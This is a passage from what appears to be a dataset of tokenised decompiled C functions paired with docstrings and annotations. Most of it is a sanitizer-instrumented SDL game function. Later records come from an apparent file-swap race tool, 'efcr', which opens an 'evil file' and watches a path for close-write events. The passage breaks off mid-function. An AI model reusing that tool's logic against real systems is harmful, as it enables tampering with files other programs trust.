            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235320",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "score",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "28",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "score",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "score",
            ")",
            ";",
            "}",
            "v2",
            "=",
            "g",
            "-",
            ">",
            "score",
            ";",
            "v3",
            "=",
            "40",
            "*",
            "lines",
            ";",
            "if",
            "(",
            "!",
            "is_mul_ok",
            "(",
            "0x28u",
            ",",
            "lines",
            ")",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_235CC0",
            ",",
            "lines",
            ",",
            "40L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235380",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "level",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "32",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "level",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "level",
            ")",
            ";",
            "}",
            "v4",
            "=",
            "g",
            "-",
            ">",
            "level",
            ";",
            "v5",
            "=",
            "v4",
            "*",
            "v3",
            ";",
            "if",
            "(",
            "!",
            "is_mul_ok",
            "(",
            "v4",
            ",",
            "v3",
            ")",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_235D00",
            ",",
            "v3",
            ",",
            "v4",
            ")",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "v5",
            ",",
            "v2",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_235D40",
            ",",
            "v2",
            ",",
            "v5",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2353E0",
            ",",
            "g",
            ")",
            ";",
            "g",
            "-",
            ">",
            "score",
            "=",
            "v5",
            "+",
            "v2",
            ";",
            "}",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2357A0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "level",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "32",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "level",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "level",
            ")",
            ";",
            "}",
            "v17",
            "=",
            "g",
            "-",
            ">",
            "level",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235800",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "score",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "28",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "score",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "score",
            ")",
            ";",
            "}",
            "v18",
            "=",
            "g",
            "-",
            ">",
            "score",
            ";",
            "if",
            "(",
            "v17",
            "=",
            "=",
            "0",
            "|",
            "|",
            "v18",
            "=",
            "=",
            "0x80000000",
            "&",
            "&",
            "v17",
            "=",
            "=",
            "-",
            "1",
            ")",
            "__ubsan_handle_divrem_overflow",
            "(",
            "&",
            "off_2352A0",
            ",",
            "v18",
            ",",
            "v17",
            ")",
            ";",
            "v19",
            "=",
            "v18",
            "/",
            "v17",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235860",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "level",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "32",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "level",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "level",
            ")",
            ";",
            "}",
            "v20",
            "=",
            "g",
            "-",
            ">",
            "level",
            ";",
            "v21",
            "=",
            "1000",
            "*",
            "v20",
            ";",
            "if",
            "(",
            "!",
            "is_mul_ok",
            "(",
            "0x3E8u",
            ",",
            "v20",
            ")",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_235FC0",
            ",",
            "v20",
            ",",
            "1000L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v19",
            ">",
            "v21",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2358C0",
            ",",
            "g",
            ")",
            ";",
            "v22",
            "=",
            "g",
            "-",
            ">",
            "level",
            ";",
            "v23",
            "=",
            "__OFADD__",
            "(",
            "1",
            ",",
            "v22",
            ")",
            ";",
            "v24",
            "=",
            "v22",
            "+",
            "1",
            ";",
            "if",
            "(",
            "v23",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_236000",
            ",",
            "g",
            "-",
            ">",
            "level",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235920",
            ",",
            "g",
            ")",
            ";",
            "g",
            "-",
            ">",
            "level",
            "=",
            "v24",
            ";",
            "}",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235980",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ")",
            ";",
            "}",
            "ms",
            "=",
            "g",
            "-",
            ">",
            "ms",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2359E0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ")",
            ";",
            "}",
            "copyMatrix",
            "(",
            "g",
            "-",
            ">",
            "ns",
            ",",
            "ms",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "g",
            "-",
            ">",
            "shape",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "g",
            "-",
            ">",
            "next",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235A40",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ls",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "16",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ls",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "ls",
            ")",
            ";",
            "}",
            "ls",
            "=",
            "g",
            "-",
            ">",
            "ls",
            ";",
            "Ticks",
            "=",
            "SDL_GetTicks",
            "(",
            ")",
            ";",
            "v28",
            "=",
            "Ticks",
            ";",
            "if",
            "(",
            "!",
            "ls",
            ")",
            "__ubsan_handle_divrem_overflow",
            "(",
            "&",
            "off_2352E0",
            ",",
            "Ticks",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "v29",
            "=",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "(",
            "*",
            "s",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "(",
            "int",
            ")",
            "(",
            "v28",
            "%",
            "ls",
            ")",
            "]",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235AA0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ")",
            ";",
            "}",
            "v30",
            "=",
            "g",
            "-",
            ">",
            "ms",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235B00",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ")",
            ";",
            "}",
            "copyMatrix",
            "(",
            "g",
            "-",
            ">",
            "ns",
            ",",
            "v30",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "g",
            "-",
            ">",
            "next",
            ",",
            "v29",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235B60",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "m",
            ")",
            ";",
            "}",
            "m",
            "=",
            "g",
            "-",
            ">",
            "m",
            ";",
            "v23",
            "=",
            "__OFSUB__",
            "(",
            "m",
            ",",
            "4",
            ")",
            ";",
            "v32",
            "=",
            "m",
            "-",
            "4",
            ";",
            "if",
            "(",
            "v23",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_236040",
            ",",
            "g",
            "-",
            ">",
            "m",
            ",",
            "4L",
            "L",
            ")",
            ";",
            "v33",
            "=",
            "v32",
            "/",
            "2",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235BC0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "20",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "x",
            ")",
            ";",
            "}",
            "g",
            "-",
            ">",
            "x",
            "=",
            "v33",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235C20",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "24",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "y",
            ")",
            ";",
            "}",
            "g",
            "-",
            ">",
            "y",
            "=",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `handle_add_overflow` seems to be part of a larger system for handling various types of overflow and type mismatch errors in C/C++ code, likely intended for use with compilers supporting the `-fsanitize=undefined` flag, providing handlers for different overflow scenarios and type mismatches to address undefined behavior.",
            "The function `san_handle_type` appears to be part of a sanitizer implementation, specifically handling type mismatches and various overflow conditions in a low-level system, likely within a C or C++ codebase, providing error handling and reporting mechanisms for such situations.",
            ""
        ],
        "longer_label": "The provided code appears to be a function in C/C++ implementing game logic, featuring extensive error handling for various overflow conditions and type mismatches, likely intended for use with compilers supporting the `-fsanitize=undefined` flag for detecting and addressing undefined behavior."
    },
    {
        "id": 237,
        "docstring_tokens": [
            "The",
            "code",
            "prints",
            "the",
            "SDL",
            "error",
            "message",
            "to",
            "the",
            "standard",
            "error",
            "stream",
            ",",
            "quits",
            "the",
            "SDL",
            "subsystem",
            ",",
            "and",
            "exits",
            "the",
            "program",
            "with",
            "an",
            "error",
            "code",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "fail",
            "(",
            ")",
            "{",
            "const",
            "char",
            "*",
            "Error",
            ";",
            "FILE",
            "*",
            "v1",
            ";",
            "Error",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "SDL_GetError",
            "(",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "_bss_start",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "_bss_start",
            ")",
            ";",
            "v1",
            "=",
            "_bss_start",
            ";",
            "if",
            "(",
            "!",
            "_bss_start",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_2365C0",
            ")",
            ";",
            "fprintf",
            "(",
            "v1",
            ",",
            "\"%s\\n\"",
            ",",
            "Error",
            ")",
            ";",
            "SDL_Quit",
            "(",
            ")",
            ";",
            "__asan_handle_no_return",
            "(",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `SDL_GetError` is used in a SDL2-based program to retrieve error messages generated by SDL functions, ensuring that error messages are accessible for debugging and error handling purposes.",
            "The function `asan_report_load8` likely reports an error or issue related to a memory load operation of 8 bytes in size within a program utilizing AddressSanitizer (ASan), which is a tool for detecting memory corruption bugs such as buffer overflows or use-after-free errors.",
            "The function `__ubsan_handle` is likely a part of Undefined Behavior Sanitizer (UBSan) in the Linux kernel, used for handling various types of runtime errors, such as type mismatches or arithmetic overflows, providing error messages and invoking appropriate handlers.",
            "The function \"SDL_Quit__asan_handle_no_return\" is likely intended to handle quitting SDL (Simple DirectMedia Layer) while also addressing potential memory safety issues detected by AddressSanitizer, but without returning any value."
        ],
        "longer_label": "The provided code defines a function called \"fail\" which retrieves error messages using SDL_GetError, handles memory errors with asan_report_load8, and manages runtime errors with __ubsan_handle, ensuring proper error handling and debugging in a SDL2-based program utilizing AddressSanitizer and Undefined Behavior Sanitizer."
    },
    {
        "id": 238,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "named",
            "``",
            "usage",
            "''",
            "that",
            "prints",
            "a",
            "specific",
            "error",
            "message",
            "to",
            "the",
            "standard",
            "error",
            "and",
            "then",
            "exits",
            "with",
            "a",
            "specified",
            "return",
            "value",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "usage",
            "(",
            "int",
            "ret",
            ")",
            "{",
            "fwrite",
            "(",
            "\"usage: efcr evil-content replace-this\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x26uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "exit",
            "(",
            "ret",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code defines a function \"usage\" that prints a usage message to stderr and exits with a specified return code, possibly for a program related to content replacement."
    },
    {
        "id": 239,
        "docstring_tokens": [
            "The",
            "function",
            "'open_evil_file",
            "'",
            "opens",
            "a",
            "file",
            "specified",
            "by",
            "the",
            "'path",
            "'",
            "parameter",
            "in",
            "read-only",
            "mode",
            "and",
            "asserts",
            "that",
            "the",
            "file",
            "was",
            "opened",
            "successfully",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "path",
            ")",
            "{",
            "fwrite",
            "(",
            "\"efcr: Opening evil file...\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x1BuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "in_fd",
            "=",
            "open",
            "(",
            "path",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "in_fd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "__assert_fail",
            "(",
            "\"in_fd != -1\"",
            ",",
            "\"efcr.c\"",
            ",",
            "0x1Cu",
            ",",
            "\"open_evil_file\"",
            ")",
            ";",
            "fwrite",
            "(",
            "\"efcr: Evil file opened\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x17uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `fwrite` function is used to write data from a specified buffer (`ptr`) to a file (`stream`) in binary mode, with `size` and `nmemb` determining the number of bytes and the number of such elements to be written respectively, while handling potential errors and hooks for debugging purposes."
        ],
        "longer_label": "The provided code defines a function `open_evil_file` that attempts to open a file specified by the `path` parameter, writing debug messages to stderr before and after the operation, and includes an assertion check for the success of the file opening operation."
    },
    {
        "id": 240,
        "docstring_tokens": [
            "The",
            "function",
            "check_for_close",
            "initializes",
            "an",
            "inotify",
            "file",
            "descriptor",
            ",",
            "sets",
            "up",
            "a",
            "watch",
            "for",
            "a",
            "specified",
            "path",
            "for",
            "close",
            "write",
            "events",
            ",",
            "reads",
            "the",
            "inotify",
            "events",
            "buffer",
            ",",
            "retrieves",
            "the",
            "current",
            "time",
            "using",
            "CLOCK_MONOTONIC",
            ",",
            "and",
            "removes",
            "the",
            "watch",
            "before",
            "closing",
            "the",
            "inotify",
            "file",
            "descriptor",
            ",",
            "returning",
            "1",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "path",
            ",",
            "timespec",
            "*",
            "t",
            ")",
            "{",
            "int",
            "wd",
            ";",
            "char",
            "buf",
            "[",
            "272",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "fwrite",
            "(",
            "\"efcr: Initializing inotify fd...\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x21uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "inofd",
            "=",
            "inotify_init",
            "(",
            ")",
            ";",
            "if",
            "(",
            "inofd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "__assert_fail",
            "(",
            "\"(inofd = inotify_init()) != -1\"",
            ",",
            "\"efcr.c\"",
            ",",
            "0x26u",
            ",",
            "\"check_for_close\"",
            ")",
            ";",
            "fwrite",
            "(",
            "\"efcr: Setting up inotify watch...\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x22uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "wd",
            "=",
            "inotify_add_watch",
            "(",
            "inofd",
            ",",
            "path",
            ",",
            "8u",
            ")",
            ";",
